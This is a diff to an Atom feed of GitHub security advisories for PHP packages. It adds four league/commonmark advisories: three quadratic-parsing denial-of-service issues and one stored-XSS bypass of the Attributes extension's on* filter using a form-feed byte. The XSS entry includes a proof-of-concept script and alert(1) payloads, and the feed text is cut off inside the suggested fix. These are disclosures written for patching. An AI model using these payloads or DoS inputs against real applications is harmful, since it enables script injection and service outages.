@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-09-01T17:56:13.301Z</updated>
+    <updated>2026-09-01T20:30:26.125Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,409 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[league/commonmark] league/commonmark: Denial of service via distinctly-named attributes in the Attributes extension]]></title>
+        <id>https://github.com/advisories/GHSA-8rr7-cvq3-gmfh</id>
+        <link href="https://github.com/advisories/GHSA-8rr7-cvq3-gmfh"/>
+        <updated>2026-09-01T20:28:40.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p><code>AttributesExtension</code> ships with the library but must be explicitly registered on the <code>Environment</code>; it is not included in <code>CommonMarkConverter</code>, <code>GithubFlavoredMarkdownConverter</code>, or <code>GithubFlavoredMarkdownExtension</code>. <strong>Applications that do not register <code>AttributesExtension</code> are not affected by this advisory.</strong></p>
+<p>Two paths in the extension re-process every attribute a node has already collected each time another attribute is applied to it. When the attributes carry distinct names, the collected set grows by one on every step and is walked again in full, so a run of <em>n</em> attributes costs O(n²).</p>
+<p><strong>1. Attribute nodes resolving to a common target (affected from 1.5.0).</strong></p>
+<p><code>AttributesListener::processDocument()</code> merges each attribute node into the set accumulated for its target, then filters the result. Both operations traverse that entire set: <code>AttributesHelper::mergeAttributes()</code> rebuilds it with <code>array_merge()</code>, and <code>AttributesHelper::filterAttributes()</code> matches a regular expression against every name in it. A run of attribute nodes sharing one target therefore re-walks a set that grows by a key per node.</p>
+<p>Two input shapes reach this path: adjacent inline attributes at the start of a block (<code>{a0="v"}{a1="v"}…</code>, where quoting the values is what keeps them separate — an unquoted value swallows the <code>}{</code> that follows it), and a chain of attribute blocks held at their default target by reference definitions (<code>{a0=v}</code> / <code>[a]: u</code> / <code>{a1=v}</code> / <code>[a]: u</code> / …).</p>
+<p>256 KB of adjacent inline attributes takes 20.0 seconds to convert, against 0.09 seconds once patched.</p>
+<p><strong>2. Consecutive attribute-block lines (affected from 2.0.0).</strong></p>
+<p><code>AttributesBlockContinueParser::tryContinue()</code> merges each continuation line into the block's accumulated attributes, again rebuilding the whole set on every line. One distinct attribute per line (<code>{a0=v}</code> / <code>{a1=v}</code> / …) grows it by a key each time.</p>
+<p>256 KB of such lines takes 1.9 seconds to convert while producing <strong>zero bytes of output</strong>, against 0.08 seconds once patched.</p>
+<p><strong>Relationship to GHSA-jjv6-8j6v-6j52.</strong> The fix released in 2.9.1 for that advisory made the <code>class</code> attribute cheap to accumulate, but left every other attribute name on the original path. <strong>Applications that upgraded to 2.9.1 or 2.9.2 remain exposed to this variant.</strong></p>
+<p><strong>Overall impact.</strong> An unauthenticated attacker who can submit Markdown to an affected application can consume disproportionate CPU time with a comparatively small request, occupying PHP workers and preventing legitimate requests from completing. The impact is limited to availability: no data is disclosed, rendered output is unchanged, and no rendering restriction is bypassed.</p>
+<h3 id="patches">Patches</h3>
+<p>The issue is patched in <code>2.10.0</code>. Both paths now fold each node — or each line — into the accumulated attributes at a cost proportional to that node or line alone, rather than re-merging and re-filtering everything gathered so far. Rendered output is unchanged, down to the order in which attributes appear.</p>
+<p>The listener path affects <code>1.5.0</code> through <code>2.9.2</code>. The continuation-line path affects <code>2.0.0</code> through <code>2.9.2</code>. The 1.x release line is no longer supported, so its users must upgrade to <code>2.10.0</code> or later.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If you cannot upgrade immediately:</p>
+<ul>
+<li><strong>Do not register <code>AttributesExtension</code></strong> when converting untrusted Markdown. This fully removes both paths.</li>
+<li>If the extension is required, <strong>impose a strict maximum input length before conversion</strong>. Because the cost is quadratic, the cap must be small to meaningfully bound worst-case CPU time.</li>
+</ul>
+<p>The <code>attributes/allow</code> allow-list added in 2.7.0 is <strong>not</strong> a mitigation. A non-empty allow-list happens to bound the first path, because unlisted names are discarded before they accumulate, but it does nothing for the second: continuation lines are merged while parsing, before any filtering takes place.</p>
+<p>Restricting conversion to trusted users, applying strict execution-time limits, and rate-limiting requests reduce exposure but are not substitutes for upgrading.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/thephpleague/commonmark/security/advisories/GHSA-8rr7-cvq3-gmfh">https://github.com/thephpleague/commonmark/security/advisories/GHSA-8rr7-cvq3-gmfh</a></li>
+<li><a href="https://github.com/thephpleague/commonmark/commit/f27eb720972490b5af4dbb635ad8634529faf9f2">https://github.com/thephpleague/commonmark/commit/f27eb720972490b5af4dbb635ad8634529faf9f2</a></li>
+<li><a href="https://github.com/thephpleague/commonmark/releases/tag/2.10.0">https://github.com/thephpleague/commonmark/releases/tag/2.10.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-8rr7-cvq3-gmfh">https://github.com/advisories/GHSA-8rr7-cvq3-gmfh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8rr7-cvq3-gmfh</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-01T20:28:40.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[league/commonmark] league/commonmark: Denial of service in the SmartPunct and Attributes extensions]]></title>
+        <id>https://github.com/advisories/GHSA-jjv6-8j6v-6j52</id>
+        <link href="https://github.com/advisories/GHSA-jjv6-8j6v-6j52"/>
+        <updated>2026-09-01T20:21:45.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Two first-party extensions contain quadratic parsing paths. Both ship with the library but must be explicitly registered on the <code>Environment</code>; neither is included in <code>CommonMarkConverter</code>, <code>GithubFlavoredMarkdownConverter</code>, or <code>GithubFlavoredMarkdownExtension</code>. <strong>Applications that do not register <code>SmartPunctExtension</code> or <code>AttributesExtension</code> are not affected by this advisory.</strong></p>
+<p><strong>1. <code>SmartPunctExtension</code> — quote replacement recopies the whole text node (affected from 2.0.0).</strong></p>
+<p><code>ReplaceUnpairedQuotesListener</code> converts each unpaired <code>Quote</code> node back to a <code>Text</code> node and merges it into its neighbours via <code>AdjacentTextMerger</code>. The merge reads the left node's literal into a local variable, appends to that variable, and writes it back — and because the read aliases the node's string, every append copies the entire accumulated literal rather than only the bytes added. The listener runs this once per surviving unpaired quote against the same continuously growing text node, so the same buffer is fully re-copied a linear number of times.</p>
+<p>A 1.2 MB document of alternating text segments and apostrophes takes 34.9 seconds to convert, against 0.069 seconds for the same input with the extension not registered.</p>
+<p>Hardened configuration makes this <em>worse</em> rather than better: <code>QuoteParser</code> appends the <code>Quote</code> node to the AST before pushing it onto the delimiter stack, so <code>max_delimiters_per_line</code> removes the quote-pairing work while leaving every node the listener must process.</p>
+<p><strong>2. <code>AttributesExtension</code> — block-level attribute runs re-scan their siblings (affected from 1.5.0).</strong></p>
+<p><code>AttributesListener::findTargetAndDirection()</code> walks the entire remaining sibling chain for every block-level <code>Attributes</code> node whose target is the following node. The backward half of that walk returns immediately for such nodes, and the forward half stops only at a sibling that is not itself an attributes node — which a contiguous run never provides — so a run of k nodes costs k(k-1)/2 steps.</p>
+<p>An input placing each <code>{#a}</code> on its own line, with a single reference definition to keep the run contiguous, takes 28.4 seconds at 16,000 attribute blocks while producing <strong>zero bytes of output</strong>.</p>
+<p>This is the block-level counterpart of GHSA-g2gp-3wwq-f4ph, patched in 2.9.0. <strong>That fix is incomplete:</strong> the early break it introduced is guarded on the node being an <code>AttributesInline</code>, so block-level <code>Attributes</code> nodes still re-scan. Applications that upgraded to 2.9.0 specifically to address GHSA-g2gp-3wwq-f4ph remain exposed to this variant.</p>
+<p><strong>3. <code>AttributesExtension</code> — class lists are rebuilt on every merge (affected from 1.5.0).</strong></p>
+<p><code>AttributesHelper::mergeAttributes()</code> round-trips the accumulated class list through <code>explode</code> and <code>implode</code> on each merge. An <code>#id</code> attribute assigns a scalar and skips the branch entirely, but a <code>.class</code> attribute appends to an array which is then imploded to a string, written to the target node, and read back on the next iteration — so the <em>i</em>th merge pays a cost proportional to <em>i</em> three separate times.</p>
+<p><code>{.c}</code> repeated 32,000 times takes 33.5 seconds, against 0.26 seconds for byte-identical input using <code>{#a}</code> — a 130x gap that widens with input size. Both the inline and the block-level attribute paths are affected.</p>
+<p><strong>Overall impact.</strong> An unauthenticated attacker who can submit Markdown to an affected application can consume disproportionate CPU time with a comparatively small request, occupying PHP workers and preventing legitimate requests from completing. The impact is limited to availability: no data is disclosed, rendered output is unchanged, and no rendering restriction is bypassed.</p>
+<p>No library-level configuration gates any of these paths. For the Attributes extension in particular, neither the <code>attributes/allow</code> allow-list nor the <code>on*</code> event-handler hardening added in 2.7.0 has any effect, because the expensive work happens while parsing and resolving the AST, before any attribute filtering or rendering takes place.</p>
+<h3 id="patches">Patches</h3>
+<p>The issues are patched in <code>2.9.1</code> and later:</p>
+<ul>
+<li>Adjacent text merging now appends in place instead of reading, modifying, and writing back the whole literal, so a merge costs only the bytes added. This fixes the defect for every caller, not only the SmartPunct listener.</li>
+<li><code>AttributesListener</code> now records the runs it has already walked, so each contiguous run of block-level attribute nodes is scanned once rather than once per node.</li>
+<li>Accumulated class lists no longer pass through <code>mergeAttributes()</code> repeatedly; the listener holds pending attributes and joins them in a single pass.</li>
+</ul>
+<p>The SmartPunct path affects <code>2.0.0</code> through <code>2.9.0</code>. The Attributes paths affect <code>1.5.0</code> through <code>2.9.0</code>, including releases that already contain the 2.9.0 fix for GHSA-g2gp-3wwq-f4ph. The 1.x release line is no longer supported, so its users must upgrade to <code>2.9.1</code> or later.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If you cannot upgrade immediately:</p>
+<ul>
+<li><strong>Do not register <code>SmartPunctExtension</code> or <code>AttributesExtension</code></strong> when converting untrusted Markdown. This fully removes the affected paths.</li>
+<li>If either extension is required, <strong>impose a strict maximum input length before conversion</strong>. Because the cost is quadratic, even a modest cap must be small to meaningfully bound worst-case CPU time.</li>
+</ul>
+<p>Restricting conversion to trusted users, applying strict execution-time limits, and rate-limiting requests reduce exposure but are not substitutes for upgrading. Configuration options including <code>attributes/allow</code>, <code>max_delimiters_per_line</code>, <code>max_nesting_level</code>, <code>html_input</code>, and <code>allow_unsafe_links</code> do not mitigate these issues.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/thephpleague/commonmark/security/advisories/GHSA-jjv6-8j6v-6j52">https://github.com/thephpleague/commonmark/security/advisories/GHSA-jjv6-8j6v-6j52</a></li>
+<li><a href="https://github.com/thephpleague/commonmark/commit/04a5d11ef6bf2d0b927310810d6a2a85d3c184b9">https://github.com/thephpleague/commonmark/commit/04a5d11ef6bf2d0b927310810d6a2a85d3c184b9</a></li>
+<li><a href="https://github.com/thephpleague/commonmark/commit/2f611b599c51661b005dc45c16ceaa547546e687">https://github.com/thephpleague/commonmark/commit/2f611b599c51661b005dc45c16ceaa547546e687</a></li>
+<li><a href="https://github.com/thephpleague/commonmark/releases/tag/2.9.1">https://github.com/thephpleague/commonmark/releases/tag/2.9.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-jjv6-8j6v-6j52">https://github.com/advisories/GHSA-jjv6-8j6v-6j52</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jjv6-8j6v-6j52</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-01T20:21:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[league/commonmark] league/commonmark: Denial of service via crafted code fences, reference links, and emphasis delimiters]]></title>
+        <id>https://github.com/advisories/GHSA-j8pm-gj4c-rq4x</id>
+        <link href="https://github.com/advisories/GHSA-j8pm-gj4c-rq4x"/>
+        <updated>2026-09-01T20:19:24.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Affected versions of <code>league/commonmark</code> perform super-linear work on three independent parsing paths, all of which are reachable on a stock <code>new CommonMarkConverter()</code> with default configuration and no extensions registered. Each trigger fits on a single line of input, so no complex Markdown structure is required.</p>
+<p>The three paths were introduced at different times. This advisory's version range is their union; the individual ranges are:</p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Affected from</th>
+<th>Affected through</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1. Fenced code block detection</td>
+<td><code>0.6.0</code></td>
+<td><code>2.9.0</code></td>
+</tr>
+<tr>
+<td>2. Reference link label lookup</td>
+<td><code>0.6.0</code></td>
+<td><code>2.9.0</code></td>
+</tr>
+<tr>
+<td>3. Emphasis / strikethrough delimiters (<code>*</code>, <code>_</code>, <code>~</code>)</td>
+<td><code>2.6.0</code></td>
+<td><code>2.9.0</code></td>
+</tr>
+<tr>
+<td>3. Highlight delimiters (<code>=</code>)</td>
+<td><code>2.9.0</code></td>
+<td><code>2.9.0</code></td>
+</tr>
+</tbody></table>
+<p><strong>1. Fenced code block detection — quadratic, affected from 0.6.0.</strong></p>
+<p><code>FencedCodeStartParser</code> matches the following pattern:</p>
+<pre><code>/^[ \t]*(?:`{3,}(?!.*`)|~{3,})/
+</code></pre>
+<p>The lookahead enforces the CommonMark rule that a backtick fence's info string may not itself contain a backtick, but neither the lookahead nor the backtick run it guards is atomic or possessive. On a line consisting of a long backtick run, filler text, and a single trailing backtick, the quantifier gives back one character at a time and re-runs the lookahead across the remainder of the line on every candidate fence length.</p>
+<p>A 320 KB single line takes roughly 27 seconds to convert. The identical payload with one <code>x</code> character prefixed — which fails the parser's own leading-character guard — takes 0.011 seconds. <code>preg_last_error()</code> returns <code>0</code> at every input size tested, including runs of 160,000 characters, so PCRE never reaches <code>pcre.backtrack_limit</code> and this is sustained CPU consumption rather than an early bail-out.</p>
+<p><strong>2. Reference link label lookup — effectively quadratic, affected from 0.6.0.</strong></p>
+<p>When a shortcut or collapsed reference link is attempted, <code>CloseBracketParser::tryParseReference()</code> copies the entire span between the brackets and passes it to <code>ReferenceMap::get()</code>, which normalizes the label — up to four full passes over its length (<code>trim</code>, <code>preg_replace</code>, <code>mb_check_encoding</code>, and <code>strtolower</code>, or <code>mb_convert_case</code> on the non-ASCII path). Nested brackets produce one such lookup per closing bracket, each on a span two characters longer than the last.</p>
+<p>In 2.x the normalization sits behind an early return for an empty reference map, so a single 8-byte reference definition anywhere in the document (<code>[x]: y</code>) is enough to unlock the path. At n = 64,000 nested brackets the same input takes 22.0 seconds with that line present versus 0.59 seconds without it. A single non-ASCII character inside the brackets forces the <code>mb_convert_case</code> branch, costing roughly 2.5x more again.</p>
+<p><strong>3. Emphasis, strikethrough, and highlight delimiter processing — super-linear, affected from 2.6.0.</strong></p>
+<p><code>DelimiterStack::processDelimiters()</code> remains linear only because of the <code>openersBottom</code> memo, which bounds the backward opener scan — an argument that holds only if the memo's key space is O(1). <code>EmphasisDelimiterProcessor::getCacheKey()</code>, and the equivalents in <code>StrikethroughDelimiterProcessor</code> and <code>MarkDelimiterProcessor</code>, embed the closer's raw current run length in the key, leaving that space unbounded. An attacker spends O(n) bytes minting a growing number of distinct run lengths; each distinct length is a fresh key whose recorded bound starts at zero, forcing a full backward re-scan of the entire pile of openers.</p>
+<p>The resulting work grows as roughly n^1.5. This is sub-quadratic, but the amplification over linear growth itself scales with input size, so it worsens as inputs grow: 800 KB of ordinary asterisks, letters, and spaces costs roughly 27 seconds on a stock converter.</p>
+<p>This path is a regression introduced in <strong>2.6.0</strong>. Before that release the cache key was the bare delimiter character — a bounded key space that amortized correctly. <code>*</code> and <code>_</code> are affected on any default configuration from 2.6.0 onward. <code>~</code> (<code>StrikethroughExtension</code>, included in <code>GithubFlavoredMarkdownConverter</code> and <code>GithubFlavoredMarkdownExtension</code>) is affected from 2.6.0. <code>=</code> (<code>HighlightExtension</code>) is affected only from <strong>2.9.0</strong>, when <code>MarkDelimiterProcessor</code> was declared cacheable.</p>
+<p><strong>Overall impact.</strong> An unauthenticated attacker who can submit Markdown for conversion can use a comparatively small request to consume disproportionate CPU time. Repeated or concurrent requests can occupy all available PHP workers and prevent legitimate requests from completing. The impact is limited to availability: no data is disclosed, rendered output is unchanged, and no rendering restriction is bypassed. Applications that process only trusted Markdown are not remotely exploitable.</p>
+<p>Settings such as <code>html_input</code>, <code>allow_unsafe_links</code>, and <code>max_nesting_level</code> do not mitigate any of these, because the expensive work occurs during parsing, before rendering. <code>max_delimiters_per_line</code> bounds the third path only, and does so lossily — it silently discards emphasis once the cap is exhausted.</p>
+<h3 id="patches">Patches</h3>
+<p>The issues are patched in <code>2.9.1</code> and later:</p>
+<ul>
+<li>The fenced code block quantifier is now possessive, which is behavior-identical here: any character given back moves a backtick into the lookahead's scan range, so every retry was guaranteed to fail regardless.</li>
+<li>Reference link <em>lookups</em> now apply the CommonMark 999-character link label limit before copying and normalizing the label, matching the limit already enforced when parsing reference <em>definitions</em>. Because a definition can never exceed that length, an over-length lookup label cannot match one directly. One edge case does change: a label longer than 999 characters that <em>collapses</em> to a shorter match once whitespace is normalized — for example <code>[a</code> followed by 998 spaces and <code>b]</code> against a <code>[a b]: /url</code> definition — previously rendered as a link and now renders literally. This follows cmark, which applies its own label-length cap before normalizing (<code>cmark_reference_lookup()</code>), and matches how this library has always handled the equivalent <code>[text][label]</code> form via <code>LinkParserHelper::parseLinkLabel()</code>. commonmark.js normalizes first and still resolves such labels.</li>
+<li>Delimiter processor cache keys now clamp the run length to the coarsest bucket that can change behavior — <code>min(length, 2)</code> for emphasis, <code>min(length, 3)</code> for strikethrough and highlight — restoring a bounded key space while preserving byte-identical output.</li>
+</ul>
+<p>Versions from <code>0.6.0</code> through <code>2.9.0</code> are affected by at least one of these paths; see the table above for which paths apply to which releases. The 0.x and 1.x release lines are no longer supported, so their users must upgrade to <code>2.9.1</code> or later.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If you cannot upgrade immediately, enforce a <strong>maximum length for individual lines</strong> before passing input to the converter, in addition to a total request-size limit. A per-line limit matters because every trigger described above fits within a single line. Because the cost grows super-linearly, the cap must be genuinely small to bound worst-case CPU.</p>
+<p>Setting <code>max_delimiters_per_line</code> reduces exposure to the delimiter path only, and does so by silently dropping emphasis from the rendered output. It has no effect on the fenced code or reference link paths.</p>
+<p>Restricting conversion to trusted users, applying strict execution-time limits, rate-limiting requests, and limiting concurrent conversions all reduce exposure, but none is a complete substitute for upgrading.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/thephpleague/commonmark/security/advisories/GHSA-j8pm-gj4c-rq4x">https://github.com/thephpleague/commonmark/security/advisories/GHSA-j8pm-gj4c-rq4x</a></li>
+<li><a href="https://github.com/thephpleague/commonmark/commit/0768217751fbfaeb8d76762f6944e9af7114295e">https://github.com/thephpleague/commonmark/commit/0768217751fbfaeb8d76762f6944e9af7114295e</a></li>
+<li><a href="https://github.com/thephpleague/commonmark/commit/d9375fadc308a63a02950a68d822417a6e4c33b2">https://github.com/thephpleague/commonmark/commit/d9375fadc308a63a02950a68d822417a6e4c33b2</a></li>
+<li><a href="https://github.com/thephpleague/commonmark/commit/e0036ef031fd36ec1c3c82db8743fc928b5271c8">https://github.com/thephpleague/commonmark/commit/e0036ef031fd36ec1c3c82db8743fc928b5271c8</a></li>
+<li><a href="https://github.com/thephpleague/commonmark/releases/tag/2.9.1">https://github.com/thephpleague/commonmark/releases/tag/2.9.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-j8pm-gj4c-rq4x">https://github.com/advisories/GHSA-j8pm-gj4c-rq4x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j8pm-gj4c-rq4x</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-01T20:17:59.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[league/commonmark] league/commonmark XSS: `on*` event-handler filter in `AttributesExtension` bypassed with a U+000C form feed]]></title>
+        <id>https://github.com/advisories/GHSA-f8fg-pg57-v4j8</id>
+        <link href="https://github.com/advisories/GHSA-f8fg-pg57-v4j8"/>
+        <updated>2026-09-01T20:19:23.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>AttributesExtension</code> documents a security guarantee:</p>
+<blockquote>
+<p><strong>Note:</strong> Attributes starting with <code>on</code> (e.g. <code>onclick</code> or <code>onerror</code>) are capable of executing
+JavaScript code and are therefore <strong>never allowed by default</strong>. You must explicitly add them to
+the <code>allow</code> list if you want to use them.</p>
+<p>— <code>docs/2.x/extensions/attributes.md</code></p>
+</blockquote>
+<p>Prefixing the attribute name with a single U+000C FORM FEED byte defeats that guarantee.
+<code>{&lt;FF&gt;onclick="alert(1)"}</code> passes through <code>AttributesHelper::filterAttributes()</code> untouched and is
+written verbatim into the output, where browsers parse it as a genuine <code>onclick</code> handler.</p>
+<p>The same prefix defeats the <code>allow_unsafe_links</code> check, letting a <code>javascript:</code> URI through on
+<code>href</code> / <code>src</code> even when <code>allow_unsafe_links</code> is <code>false</code>.</p>
+<p>This bypasses the fix shipped in the <strong>2.7.0 security release</strong> ("Fix XSS in AttributesExtension",
+43207253ea5f14867c77c697cd3838c446cadcea), which added <code>filterAttributes()</code> for the express
+purpose of blocking these attributes.</p>
+<p>Throughout this report <code>&lt;FF&gt;</code> denotes a literal U+000C byte (<code>"\x0C"</code> in PHP). It is invisible in
+rendered text, so all payloads below are written with PHP escape sequences to stay unambiguous.</p>
+<h3 id="details">Details</h3>
+<p>Three behaviours combine.</p>
+<p><strong>1. <code>\x0C</code> survives the parser's <code>trim()</code>.</strong></p>
+<p><code>AttributesHelper::SINGLE_ATTRIBUTE</code> begins with <code>\s*</code>, and <code>Cursor::match()</code> returns
+<code>$matches[0][0]</code> — the <em>entire</em> match, including that leading whitespace. The result is cleaned
+with PHP's <code>trim()</code>:</p>
+<pre><code class="language-php">// src/Extension/Attributes/Util/AttributesHelper.php:62
+while ($attribute = \trim((string) $attributeCursor-&gt;match('/^' . self::SINGLE_ATTRIBUTE . '/i'))) {
+</code></pre>
+<p>PCRE <code>\s</code> matches <code>\x0C</code>, but PHP's default <code>trim()</code> charlist is <code>" \t\n\r\0\x0B"</code> — it includes
+the vertical tab <code>\x0B</code> but <strong>not</strong> the form feed <code>\x0C</code>. The byte is therefore consumed by the
+regex, retained in the returned match, and not stripped. It ends up inside the attribute name:</p>
+<pre><code class="language-php">// src/Extension/Attributes/Util/AttributesHelper.php:94
+$attributes[\trim($name)] = \trim($value);   // $name === "\x0Conclick"
+</code></pre>
+<p><code>\x0C</code> is the only byte with this property: every other character the HTML5 tokenizer treats as
+whitespace (<code>\x09</code>, <code>\x0A</code>, <code>\x0D</code>, <code>\x20</code>), plus <code>\x0B</code>, is in PHP's trim charlist. The PoC
+includes a <code>\x0B</code> case as a control, and it is correctly stripped.</p>
+<p><strong>2. The filter's string comparisons miss it.</strong></p>
+<p><code>filterAttributes()</code> compares the raw name against literal strings:</p>
+<pre><code class="language-php">// src/Extension/Attributes/Util/AttributesHelper.php:148-166
+$attrNameLower = \strtolower($name);                            // "\x0conclick"
+... ($attrNameLower === 'href' || $attrNameLower === 'src') ... // false
+... \str_starts_with($attrNameLower, 'on') ...                  // false -&gt; not removed
+</code></pre>
+<p><strong>3. The renderer never escapes attribute names.</strong></p>
+<pre><code class="language-php">// src/Util/HtmlElement.php:123-129
+$result .= ' ' . $key . '="' . Xml::escape($value) . '"';   // $key emitted raw
+</code></pre>
+<p>Because the HTML5 tokenizer treats <code>\x0C</code> as whitespace <em>between</em> attributes, the browser reads
+the name as plain <code>onclick</code>.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+
+use League\CommonMark\Environment\Environment;
+use League\CommonMark\Extension\Attributes\AttributesExtension;
+use League\CommonMark\Extension\CommonMark\CommonMarkCoreExtension;
+use League\CommonMark\MarkdownConverter;
+
+// The most defensive configuration docs/2.x/security.md recommends.
+$env = new Environment([
+    'html_input'         =&gt; 'escape',
+    'allow_unsafe_links' =&gt; false,
+    'max_nesting_level'  =&gt; 100,
+    // 'attributes' =&gt; ['allow' =&gt; [...]] deliberately left at its default []
+]);
+$env-&gt;addExtension(new CommonMarkCoreExtension());
+$env-&gt;addExtension(new AttributesExtension());
+$converter = new MarkdownConverter($env);
+
+$FF = "\x0C";
+
+echo $converter-&gt;convert('hello {onclick="alert(1)"}')-&gt;getContent();
+// &lt;p&gt;hello&lt;/p&gt;                                    &lt;- filtered, as documented
+
+echo $converter-&gt;convert('hello {' . $FF . 'onclick="alert(1)"}')-&gt;getContent();
+// &lt;p \x0Conclick="alert(1)"&gt;hello&lt;/p&gt;             &lt;- BYPASS
+</code></pre>
+<p>Full observed output (<code>\x0C</code> shown escaped; it is a literal single byte in the real output):</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Markdown input</th>
+<th>Rendered output</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A</td>
+<td><code>hello {onclick="alert(1)"}</code></td>
+<td><code>&lt;p&gt;hello&lt;/p&gt;</code></td>
+<td>filtered (control)</td>
+</tr>
+<tr>
+<td>B</td>
+<td><code>hello {\x0Conclick="alert(1)"}</code></td>
+<td><code>&lt;p \x0Conclick="alert(1)"&gt;hello&lt;/p&gt;</code></td>
+<td><strong>bypass</strong></td>
+</tr>
+<tr>
+<td>C</td>
+<td><code>hello {\x0Bonclick="alert(1)"}</code></td>
+<td><code>&lt;p&gt;hello&lt;/p&gt;</code></td>
+<td>filtered (control)</td>
+</tr>
+<tr>
+<td>D</td>
+<td><code>[click](javascript:alert(1))</code></td>
+<td><code>&lt;p&gt;&lt;a&gt;click&lt;/a&gt;&lt;/p&gt;</code></td>
+<td>filtered (control)</td>
+</tr>
+<tr>
+<td>E</td>
+<td><code>[click](https://example.com){\x0Chref="javascript:alert(1)"}</code></td>
+<td><code>&lt;p&gt;&lt;a \x0Chref="javascript:alert(1)" href="https://example.com"&gt;click&lt;/a&gt;&lt;/p&gt;</code></td>
+<td><strong>bypass</strong></td>
+</tr>
+<tr>
+<td>F</td>
+<td><code>![x](https://example.invalid/x.png){\x0Conerror="alert(1)"}</code></td>
+<td><code>&lt;p&gt;&lt;img \x0Conerror="alert(1)" src="…" alt="x" /&gt;&lt;/p&gt;</code></td>
+<td><strong>bypass</strong></td>
+</tr>
+<tr>
+<td>G</td>
+<td><code># heading</code> + newline + <code>{\x0Conclick="alert(1)"}</code></td>
+<td><code>&lt;h1 \x0Conclick="alert(1)"&gt;heading&lt;/h1&gt;</code></td>
+<td><strong>bypass</strong> (block syntax)</td>
+</tr>
+</tbody></table>
+<p>In case E the injected <code>href</code> precedes the legitimate one. Per the HTML5 duplicate-attribute rule
+the <strong>first</strong> occurrence wins, so the <code>javascript:</code> URI is the one the browser actually uses.</p>
+<p><strong>Browser confirmation.</strong> Loading the library's unmodified output in Chrome for Testing 148:</p>
+<pre><code>&lt;img&gt; attribute names : ["onerror","src","alt"]      &lt;- parsed as a real `onerror`
+typeof img.onerror    : function                     &lt;- bound as an event handler
+handlers fired        : ["img-onerror"]              &lt;- fired on load, no interaction
+document.title        : XSS-FIRED
+link href attribute   : "javascript:void(0)"
+link href property    : "javascript:void(0)"         &lt;- javascript: URI is the effective href
+page errors           : []
+</code></pre>
+<p>The <code>onerror</code> case executes with <strong>no user interaction</strong> — rendering the attacker's Markdown is
+sufficient.</p>
+<p>Verified against git HEAD (<code>f966b17a</code>) and against tag <code>2.9.0</code>, on PHP 8.5.8.</p>
+<h3 id="impact">Impact</h3>
+<p>Stored cross-site scripting in any application that renders untrusted Markdown with
+<code>AttributesExtension</code> enabled and <code>attributes.allow</code> left at its default <code>[]</code> — even when the
+application has followed every hardening step in <code>docs/2.x/security.md</code>
+(<code>html_input =&gt; 'escape'</code>, <code>allow_unsafe_links =&gt; false</code>, <code>max_nesting_level =&gt; 100</code>).</p>
+<p>Consequences are the usual for stored XSS: session and cookie theft, actions performed as the
+viewing user, and account takeover where the host application permits it. Because the payload can
+be attached to an image (<code>onerror</code>), it fires on page load without requiring the victim to
+interact with anything.</p>
+<p>The affected configuration is the extension's default: <code>attributes.allow</code> defaults to <code>[]</code>, and
+the documentation describes that default as safe with respect to <code>on*</code> attributes.</p>
+<h3 id="workaround-for-users">Workaround for users</h3>
+<p>Setting an explicit allow list takes the other branch of <code>filterAttributes()</code>, which drops the
+form-feed name because it is not in the list:</p>
+<pre><code class="language-php">$config = ['attributes' =&gt; ['allow' =&gt; ['id', 'class', 'align']]];
+</code></pre>
+<p>Verified: <code>hello {\x0Conclick="alert(1)"}</code> then renders as <code>&lt;p&gt;hello&lt;/p&gt;</code>.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>The narrow fix is to add <code>\x0C</code> to the trim charlist at <code>AttributesHelper.php</code> lines 62, 89, 90
+and 94. That closes this instance but leaves the shape of the problem in place.</p>
+<p>A more durable fix is to reject anything that is not a well-formed attribute name in
+<code>filterAttributes()</code>, reusing the constant the parser already defines (<code>RegexHelper</code> is already
+imported in that file):</p>
+<pre><code class="language-php">foreach ($attributes as $name =&gt; $value) {
+    // Names are compared against literal strings below and emitted without escaping,
+    // so anything that isn't a plain attribute name must not get through.
